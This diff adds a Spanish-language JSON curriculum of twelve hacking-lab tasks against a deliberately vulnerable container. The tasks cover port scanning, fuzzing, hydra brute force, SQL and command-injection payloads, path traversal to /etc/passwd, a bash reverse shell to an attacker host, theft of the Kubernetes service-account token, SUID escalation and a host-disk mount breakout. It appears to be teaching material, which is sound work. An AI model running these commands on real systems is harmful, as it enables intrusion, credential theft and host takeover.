@@ -1,0 +1,162 @@
+{
+  "tasks": {
+    "1": {
+      "title": "Reconocimiento: Escaneo de Puertos Básico",
+      "module": "Nivel 1: Reconocimiento Web",
+      "content": "¡Bienvenido a la red enemiga, Hacker! El objetivo está alojado en `vulnerable-pod`. Tu primera misión es descubrir qué puertos tiene abiertos y qué servicios corren en ellos.\n\nPuedes automatizar esto creando un pequeño script en bash que itere sobre un diccionario de puertos comunes, o bien, usar directamente Nmap para hacer ruido.",
+      "goal": "Escanea el contenedor 'vulnerable-pod' para encontrar sus puertos abiertos. Redirige tu ataque al puerto revelado.",
+      "code": "#!/bin/bash\n# Diccionario simple de puertos a escanear\nPUERTOS=\"80 443 8080 9090\"\n\nfor puerto in $PUERTOS; do\n  echo \"Testeando puerto $puerto...\"\n  nc -zv vulnerable-pod $puerto 2>&1 | grep -i 'open\\|succeeded'\ndone",
+      "steps": [
+        {
+          "t": "Scan Silencioso Script",
+          "c": "bash scan_ports.sh"
+        },
+        {
+          "t": "Escaneo Agresivo (Nmap)",
+          "c": "nmap -p- vulnerable-pod"
+        }
+      ]
+    },
+    "2": {
+      "title": "Fuzzing y Búsqueda de Rutas",
+      "module": "Nivel 1: Reconocimiento Web",
+      "content": "Los administradores de sistemas a menudo dejan carpetas ocultas o de respaldo en sus servidores web. Usa una herramienta como `gobuster` o un script en bash para descubrir directorios.",
+      "goal": "Encuentra directorios web ocultos en el servicio objetivo que corre en el puerto 9090.",
+      "code": "#!/bin/bash\n# Puedes fabricar tu propio fuzzer usando un archivo temporal o wordlist\n\nwhile read -r dir; do\n  status=$(curl -s -o /dev/null -w \"%{http_code}\" \"http://vulnerable-pod:9090/$dir\")\n  if [ \"$status\" == \"200\" ]; then\n    echo \"[!] Directorio Encontrado: /$dir (Código 200)\"\n  fi\ndone < /usr/share/wordlists/dirb/common.txt",
+      "steps": [
+        {
+          "t": "Lanzar Gobuster",
+          "c": "gobuster dir -u http://vulnerable-pod:9090 -w /usr/share/wordlists/rockyou.txt"
+        }
+      ]
+    },
+    "3": {
+      "title": "Ataque de Fuerza Bruta a Consola",
+      "module": "Nivel 2: Infiltración",
+      "content": "Hemos detectado un panel de Login en nuestra enumeración web. Vas a intentar inyectar usuarios predeterminados mediante la terminal. Emplea tus diccionarios de claves de Red Team.",
+      "goal": "Realiza un ataque de fuerza bruta básico para superar el portal de login, o prueba una clásica inyección SQL (' or 1=1--).",
+      "steps": [
+        {
+          "t": "Fuerza Bruta a Parámetros",
+          "c": "hydra -l admin -P /usr/share/wordlists/rockyou.txt vulnerable-pod http-post-form"
+        }
+      ]
+    },
+    "4": {
+      "title": "Inyección de Comandos Remota",
+      "module": "Nivel 2: Infiltración",
+      "content": "¡Golpe Crítico! A través del panel web, encontraste una entrada vulnerable a RCE (Remote Code Execution). Intenta ejecutar comandos de sistema subyacente para inspeccionar quién eres en el servidor.",
+      "goal": "Logra ejecutar 'whoami' mandando cargas maliciosas por la herramienta web vulnerable.",
+      "code": "# Carga para el input web: 127.0.0.1; whoami\n# Carga para intentar ver ID: 127.0.0.1 && id",
+      "steps": [
+        {
+          "t": "Verificar Identidad Remota",
+          "c": "whoami"
+        }
+      ]
+    },
+    "5": {
+      "title": "Captura de Archivos Locales (LFI)",
+      "module": "Nivel 2: Infiltración",
+      "content": "Explotando un fallo de Local File Inclusion, tienes la capacidad de leer archivos de configuración internos. Vamos a intentar cazar las banderas (Flags) ocultas y archivos del sistema como el passwd.",
+      "goal": "Lee satisfactoriamente el archivo /etc/passwd del servidor.",
+      "steps": [
+        {
+          "t": "Explotar Path Traversal",
+          "c": "curl 'http://vulnerable-pod:9090/?page=../../../../etc/passwd'"
+        }
+      ]
+    },
+    "6": {
+      "title": "El Envenenamiento: Reverse Shell",
+      "module": "Nivel 3: Pivoting",
+      "content": "Toda esa ejecución web es aburrida. Queremos una terminal directa (Reverse Shell) que conecte el DVWA con nuestra máquina atacante.",
+      "goal": "Abre un puerto con Netcat para quedar en modo Escucha y manda la carga de Reverse Shell por el fallo Web.",
+      "code": "# Bash Reverse Shell One-Liner:\nbash -c 'bash -i >& /dev/tcp/cnu-student-attacker/4444 0>&1'",
+      "steps": [
+        {
+          "t": "Configurar Listener",
+          "c": "nc -lvnp 4444"
+        }
+      ]
+    },
+    "7": {
+      "title": "Visión de Túnel (Enumeración Interna)",
+      "module": "Nivel 3: Pivoting",
+      "content": "Una vez dentro de la Reverse Shell, es hora de averiguar dónde caímos. ¿Es un Servidor Físico? ¿Una VM? ¿Un Pod de Docker/Kubernetes?",
+      "goal": "Navega las entrañas del sistema hosteado para encontrar indicios de contenedores (.dockerenv, cgroups).",
+      "steps": [
+        {
+          "t": "Confirmar Contenedor",
+          "c": "ls -la /.dockerenv"
+        }
+      ]
+    },
+    "8": {
+      "title": "Descubriendo K8s: Service Accounts",
+      "module": "Nivel 4: K8s Breakout",
+      "content": "Si estás en K8s, busca el tesoro más grande: Los tokens de Service Account. Estos se montan automáticamente en pods y pueden darnos acceso de API.",
+      "goal": "Extrae el archivo token JWT del directorio de kubernetes.io para luego suplantar la identidad.",
+      "code": "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
+      "steps": [
+        {
+          "t": "Leer Token de API",
+          "c": "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+        }
+      ]
+    },
+    "9": {
+      "title": "Escalada Subterránea (SUID Bins)",
+      "module": "Nivel 4: K8s Breakout",
+      "content": "¿Seguimos siendo el humilde www-data? Busca binarios con permisos SUID que nos permitan subir a ROOT dentro del contenedor.",
+      "goal": "Usa comandos de Linux para encontrar archivos ejecutables pertenecientes a root que todos puedan usar.",
+      "steps": [
+        {
+          "t": "Cazar SUIDs",
+          "c": "find / -perm -4000 2>/dev/null"
+        }
+      ]
+    },
+    "10": {
+      "title": "Elevación Exitosa",
+      "module": "Nivel 4: K8s Breakout",
+      "content": "Abusa de alguno de los binarios encontrados (ej. python3, vim, bash) para engañar al contenedor y obtener una shell interactiva como root.",
+      "goal": "Conviértete en ROOT del contenedor vulnerado y deja tu primera firma.",
+      "steps": [
+        {
+          "t": "Abuso GTFOBins",
+          "c": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+        }
+      ]
+    },
+    "11": {
+      "title": "Evaluación del Contenedor (Privileged)",
+      "module": "Nivel 5: Dominio Total",
+      "content": "Puesto que eres ROOT del contenedor, revisa tus 'Capabilities' (permisos) de Linux. Si el pod se desplegó en modo 'Privileged', las puertas del nodo y el host están abiertas.",
+      "goal": "Usa fdisk y capsh para revisar qué privilegios tienes sobre los discos físicos del Host real.",
+      "steps": [
+        {
+          "t": "Ver Discos Físicos",
+          "c": "fdisk -l"
+        }
+      ]
+    },
+    "12": {
+      "title": "El Escape Final (Breakout!)",
+      "module": "Nivel 5: Dominio Total",
+      "content": "Si logras ver el disco primario del host (ej. /dev/sda1, /dev/vda1), es hora del asalto final. Créate una carpeta y monta allí el disco del sistema operativo de la infraestructura.",
+      "goal": "Monta el disco del host y captura la última red de Kubernetes.",
+      "code": "mkdir -p /mnt/host_root\nmount /dev/vda1 /mnt/host_root\n# Usamos la magia del chroot para engañar al sistema de archivos\nchroot /mnt/host_root",
+      "steps": [
+        {
+          "t": "Montaje Físico",
+          "c": "mount /dev/vda1 /mnt/host_root"
+        },
+        {
+          "t": "Transformación de Entorno",
+          "c": "chroot /mnt/host_root"
+        }
+      ]
+    }
+  }
+}
